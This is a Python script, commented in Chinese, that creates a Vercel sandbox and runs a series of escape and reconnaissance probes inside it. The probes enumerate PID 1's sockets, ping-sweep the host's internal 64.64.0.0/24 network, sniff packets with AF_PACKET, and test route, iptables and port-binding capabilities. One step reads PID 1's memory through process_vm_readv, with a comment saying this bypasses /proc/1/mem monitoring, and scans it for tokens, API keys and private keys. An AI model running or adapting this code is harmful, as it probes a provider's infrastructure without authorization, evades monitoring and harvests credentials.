# 实验J245: netlink归属 + 宿主内网扫描(64.64.0.0/24) + AF_PACKET抓包 + PVR读0xe9e000
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj245"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# A) 1259/1290 归属: netlink表 + unix全表 + fd类型
CODE_A = r'''
import os
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
# netlink socket 表
try:
    nl = open("/proc/1/net/netlink").read()
    for ln in nl.splitlines():
        parts = ln.split()
        if len(parts) > 3 and parts[3] in ("1259", "1290", "0"):
            p("NL", ln)
    p("NL_FULL", nl[:800].replace(chr(10), "|"))
except Exception as e:
    p("NL_EXC", repr(e))
# unix 全表 grep 1259/1290
u = open("/proc/1/net/unix").read()
for ino in ("1259", "1290"):
    for ln in u.splitlines():
        if ino in ln.split():
            p("UNIX_HIT", ino, ln)
# PID1 所有 fd 类型
for i in range(20):
    try:
        t = os.readlink("/proc/1/fd/" + str(i))
        p("FD", i, t)
    except Exception:
        pass
p("DONE_A", flush=True)
'''
run_cmd(sid, CODE_A, "A_FD", timeout=100)

# B) 宿主内网扫描: ICMP ping 64.64.0.0/24 (raw socket)
CODE_B = r'''
import socket, struct, time
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
def checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return (~s) & 0xffff
def ping(ip, tid, timeout=1.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        s.settimeout(timeout)
        pkt = struct.pack("!BBHHH", 8, 0, 0, tid, 1) + b"PINGTEST"
        pkt = pkt[:2] + struct.pack("!H", checksum(pkt)) + pkt[4:]
        s.sendto(pkt, (ip, 0))
        t0 = time.time()
        while time.time() - t0 < timeout:
            try:
                d, addr = s.recvfrom(1024)
                if d[20:21] == b'\x00':
                    return True
            except socket.timeout:
                break
        s.close()
    except Exception as e:
        return "ERR:" + str(e)[:40]
    return False
# 扫描 64.64.0.1-64.64.0.254
alive = []
for i in range(1, 255):
    ip = "64.64.0.%d" % i
    r = ping(ip, 0x1234 + i)
    if r is True:
        alive.append(ip)
        p("ALIVE", ip)
    elif isinstance(r, str):
        p("PING_ERR", ip, r)
        break
    if i % 50 == 0:
        p("PROG", i)
p("ALIVE_LIST", alive)
p("DONE_B", flush=True)
'''
run_cmd(sid, CODE_B, "B_SCAN", timeout=280)

# C) AF_PACKET 抓包 5 秒 (看网络流量)
CODE_C = r'''
import socket, time, struct
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
try:
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
    s.settimeout(1)
    s.bind(("eth0", 3))
    p("PKT", "bound")
    t0 = time.time()
    n = 0
    sample = []
    while time.time() - t0 < 5:
        try:
            d, addr = s.recvfrom(65535)
            n += 1
            if len(sample) < 5:
                # 解析 eth+ip
                eth = d[:14]
                proto = struct.unpack("!H", eth[12:14])[0]
                ipp = d[14:34]
                sample.append((hex(proto), ipp[12:16].hex(), ipp[16:20].hex(), len(d)))
        except socket.timeout:
            pass
    p("PKT_COUNT", n)
    for x in sample:
        p("PKT_SAMPLE", x)
    s.close()
except Exception as e:
    p("PKT_EXC", type(e).__name__, str(e)[:150])
p("DONE_C", flush=True)
'''
run_cmd(sid, CODE_C, "C_PKT", timeout=100)

# D) PVR 读 0xe9e000 段前 4MB (绕过 /proc/1/mem 监控)
CODE_D = r'''
import ctypes
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
class Iovec(ctypes.Structure):
    _fields_ = [("iov_base", ctypes.c_void_p), ("iov_len", ctypes.c_size_t)]
libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.process_vm_readv.argtypes = [ctypes.c_int, ctypes.POINTER(Iovec), ctypes.c_ulong, ctypes.POINTER(Iovec), ctypes.c_ulong, ctypes.c_ulong]
libc.process_vm_readv.restype = ctypes.c_ssize_t
# 分段读 0xe9e000, 每段 64KB
pat = rb"(?:secret|token|api[_-]?key|private[_-]?key|BEGIN [A-Z ]*PRIVATE|eyJ[A-Za-z0-9_-]{20,}\.|vcp_[A-Za-z0-9]{20,}|sk_[A-Za-z0-9]{20,})"
import re
base = 0xe9e000
total = 0
found = 0
for i in range(64):  # 64 * 64KB = 4MB
    off = i * 0x10000
    buf = ctypes.create_string_buffer(0x10000)
    local = Iovec(ctypes.cast(buf, ctypes.c_void_p), 0x10000)
    remote = Iovec(base + off, 0x10000)
    n = libc.process_vm_readv(1, ctypes.byref(local), 1, ctypes.byref(remote), 1, 0)
    if n <= 0:
        p("PVR_STOP", hex(base + off), "n", n, "errno", ctypes.get_errno())
        break
    total += n
    for m in re.finditer(pat, buf.raw[:n]):
        s = m.group(0)
        if len(set(s)) > 3:
            p("FOUND", hex(base + off + m.start()), s[:200])
            found += 1
            if found > 10:
                break
    if found > 10:
        break
p("PVR_TOTAL", total)
p("DONE_D", flush=True)
'''
run_cmd(sid, CODE_D, "D_PVR", timeout=100)

# E) cap_net_admin 验证: 添加路由 + iptables 可用性
CODE_E = r'''
import subprocess
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
# 添加一条测试路由 (到 10.255.255.0/24 via eth0)
r = subprocess.run("ip route add 10.255.255.0/24 dev eth0 2>&1 && echo ROUTE_ADD_OK && ip route del 10.255.255.0/24 && echo ROUTE_DEL_OK", shell=True, capture_output=True, text=True, timeout=10)
p("ROUTE", "rc", r.returncode, (r.stdout + r.stderr)[:300].replace(chr(10), "|"))
# iptables
r = subprocess.run("which iptables nft arp tcpdump 2>&1; iptables -L -n 2>&1 | head -8", shell=True, capture_output=True, text=True, timeout=10)
p("FW", "rc", r.returncode, (r.stdout + r.stderr)[:500].replace(chr(10), "|"))
# 绑定特权端口 (cap_net_bind_service)
code = "import socket; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.bind(('0.0.0.0', 80)); print('BIND80_OK', flush=True); s.listen(1); print('LISTEN_OK', flush=True)"
r = subprocess.run(["python3", "-c", code], capture_output=True, text=True, timeout=8)
p("BIND80", "rc", r.returncode, (r.stdout + r.stderr)[:200].replace(chr(10), "|"))
# 绑定宿主 IP 网段地址?
code2 = "import socket; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.bind(('64.64.0.100', 9999)); print('BIND_IP_OK', flush=True)"
r = subprocess.run(["python3", "-c", code2], capture_output=True, text=True, timeout=8)
p("BINDIP", "rc", r.returncode, (r.stdout + r.stderr)[:200].replace(chr(10), "|"))
p("DONE_E", flush=True)
'''
run_cmd(sid, CODE_E, "E_NETCAP", timeout=100)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
